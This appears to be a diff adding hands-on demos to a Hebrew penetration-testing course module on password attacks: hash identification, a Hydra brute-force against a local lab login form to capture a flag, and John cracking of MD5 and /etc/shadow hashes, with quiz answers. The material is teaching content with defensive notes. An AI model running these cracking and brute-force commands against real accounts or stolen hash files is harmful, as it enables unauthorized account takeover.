@@ -2,6 +2,8 @@
 
 > 📘 **הכול בגלילה אחת:** [**כל החומר של המודול בקובץ אחד**](כל-החומר.md) — חומר לימוד, תרגילים, תרגול ופתרונות, ברצף.
 
+> 🎬 **מודול מעשי — תפצח סיסמאות אמיתיות!** תסדוק קובץ Hash-ים ([`hashes.txt`](hashes.txt), [`shadow_demo.txt`](shadow_demo.txt)) עם **John** באופן לא-מקוון, ותפרוץ טופס התחברות חי ([`login_server.py`](login_server.py), בלי התקנות) עם **Hydra** באופן מקוון. אחרי כל הדגמה: **🧠 בדוק את עצמך**.
+
 # מודול 8 — מתקפות סיסמאות (Password Attacks)
 
 > **מטרות המודול:** לתקוף את החוליה החלשה ביותר — הסיסמה. נבין סוגי Hash וזיהוים, רשימות מילים (Wordlists), מתקפות **מקוונות** (Hydra) מול **לא-מקוונות** (John / Hashcat), ואת ההבדל בין Brute Force, Password Spraying ו-Credential Stuffing.
@@ -60,6 +62,25 @@ hash-identifier                                  # כלי אינטראקטיבי
 ```
 > 💡 זיהוי נכון של סוג ה-Hash הוא **קריטי** — Hashcat/John צריכים לדעת את המצב (mode) הנכון כדי לסדוק.
 
+### 🎬 הדגמה — נסה בעצמך: זהה סוג Hash
+> לפני שסודקים — חייבים לדעת מה סוג ה-Hash. נזהה כמה.
+
+```bash
+hashid '5f4dcc3b5aa765d61d8327deb882cf99'      # 32 hex → MD5?
+hashid '$6$abc$def...'                          # $6$ → sha512crypt (Linux shadow)
+hashid '$2b$12$...'                             # $2b$ → bcrypt
+```
+👀 האורך והתחילית מסגירים את הסוג: 32 hex = MD5, `$6$` = sha512crypt, `$2b$` = bcrypt.
+
+🎯 **מה קרה כאן:** לכל אלגוריתם "חתימה" משלו. זיהוי נכון קובע את ה-mode ב-John/Hashcat — mode שגוי = הסדיקה תיכשל.
+
+**🧠 בדוק את עצמך:** Hash שמתחיל ב-`$6$` הוא —
+- א) MD5
+- ב) sha512crypt (סיסמת Linux מ-`/etc/shadow`)
+- ג) NTLM
+
+> ✅ **תשובה: ב** — התחילית `$6$` מציינת sha512crypt, הפורמט של סיסמאות Linux ב-`/etc/shadow`. (`$1$`=MD5crypt, `$2b$`=bcrypt.)
+
 ---
 
 ## 8.3 רשימות מילים (Wordlists)
@@ -103,6 +124,43 @@ hydra -l admin -P rockyou.txt 10.0.0.5 http-post-form \
 
 > ⚠️ מתקפה מקוונת **רועשת** ועלולה לנעול חשבונות. השתמש ב-`-t 4` להאטת קצב, ותמיד רק על יעדים מורשים.
 
+### 🎬 הדגמה — נסה בעצמך: פרוץ טופס התחברות עם Hydra 🚩
+> נתקוף טופס login חי — בדיוק כמו פאנל ניהול אמיתי.
+
+**צעד 1 — טרמינל 1: הפעל את המטרה** ([`login_server.py`](login_server.py)):
+```bash
+python3 login_server.py            # http://127.0.0.1:8081 — השאר רץ
+```
+👀 גלוש לכתובת — טופס התחברות של ACME. המשתמש `admin`, הסיסמה לא ידועה.
+
+**צעד 2 — הכן רשימת סיסמאות קטנה** (או השתמש ב-rockyou):
+```bash
+printf 'password\n123456\niloveyou\nsuperman\nprincess\n' > pws.txt
+```
+**צעד 3 — טרמינל 2: שגר את Hydra על טופס ה-POST:**
+```bash
+hydra -l admin -P pws.txt 127.0.0.1 -s 8081 \
+  http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"
+```
+👀 Hydra מנסה כל סיסמה. המחרוזת `Invalid credentials` = סימן כישלון; כשהיא **נעלמת** מהתשובה — נמצאה הסיסמה:
+```text
+[8081][http-post-form] host: 127.0.0.1   login: admin   password: superman
+```
+**צעד 4 — התחבר עם מה שמצאת** וקבל את הדגל:
+```bash
+curl -s -d "user=admin&pass=superman" 127.0.0.1:8081/login | grep -o 'flag{[^}]*}'
+```
+👀 `flag{online_brute_force_cracked_the_login}` 🎉
+
+🎯 **מה קרה כאן:** Hydra שלח בקשת POST לכל סיסמה והבדיל הצלחה מכישלון לפי מחרוזת ה-`Invalid credentials`. אין הגבלת נסיונות → כל סיסמה מהרשימה נבדקה. **הגנה:** נעילת חשבון + MFA.
+
+**🧠 בדוק את עצמך:** מה תפקיד המחרוזת `Invalid credentials` בפקודת Hydra?
+- א) הסיסמה לפריצה
+- ב) "סימן הכישלון" — כל עוד היא בתשובה, ההתחברות נכשלה; היעדרה = הצלחה
+- ג) שם המשתמש
+
+> ✅ **תשובה: ב** — ב-`http-post-form`, המחרוזת האחרונה היא סימן הכישלון. Hydra מזהה הצלחה כשהתשובה **לא** מכילה אותה.
+
 ---
 
 ## 8.5 מתקפות לא-מקוונות — John the Ripper
@@ -125,6 +183,43 @@ unshadow /etc/passwd /etc/shadow > crack.txt   # מיזוג passwd+shadow
 john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
 ```
 > 🔍 זהו החיבור למודול 2: אם השגת גישה ל-`/etc/shadow`, `unshadow` + `john` יסדקו את הסיסמאות.
+
+### 🎬 הדגמה — נסה בעצמך: סדוק Hash-ים לא-מקוון עם John 🚩
+> השגנו קובץ Hash-ים (למשל מדלף DB). נסדוק אותם offline — מהיר, שקט, בלי לגעת ביעד.
+
+**צעד 1 — הצץ ב-Hash-ים** (הקובץ [`hashes.txt`](hashes.txt) — חמישה MD5):
+```bash
+cat hashes.txt
+```
+**צעד 2 — שחרר את rockyou (אם דחוס):**
+```bash
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null; echo ok
+```
+**צעד 3 — סדוק עם John:**
+```bash
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+👀 תוך שניות John מפצח את כל החמישה. הצג את התוצאות:
+```bash
+john --show --format=raw-md5 hashes.txt
+```
+👀 הסיסמאות: `password`, `iloveyou`, `sunshine`, `princess`, `superman` — כולן חלשות ולכן ב-rockyou.
+
+**צעד 4 — סדוק סיסמת Linux אמיתית** (Hash מסוג sha512crypt מ-shadow):
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow_demo.txt
+john --show shadow_demo.txt          # → victim:letmein
+```
+👀 סדקת סיסמת `/etc/shadow` — בדיוק מה שתעשה אחרי שהשגת גישה ל-root במודול 11.
+
+🎯 **מה קרה כאן:** John ניחש כל מילה מ-rockyou, חישב את ה-Hash שלה, והשווה. חד-כיווניות ה-Hash לא עוזרת כשהסיסמה חלשה ונמצאת ברשימה. **הגנה:** סיסמאות ארוכות ואקראיות + Hashing איטי (bcrypt).
+
+**🧠 בדוק את עצמך:** למה מתקפה **לא-מקוונת** (John על Hash) מהירה ושקטה יותר ממקוונת (Hydra)?
+- א) כי היא לא שולחת בקשות ליעד — הסדיקה מתבצעת מקומית על המחשב שלך
+- ב) כי John חזק מ-Hydra
+- ג) כי Hash-ים תמיד קצרים
+
+> ✅ **תשובה: א** — offline סודקים עותק מקומי של ה-Hash, בלי לגעת ביעד: אין רעש, אין נעילת חשבון, ואפשר מיליוני נסיונות בשנייה.
 
 ---
 
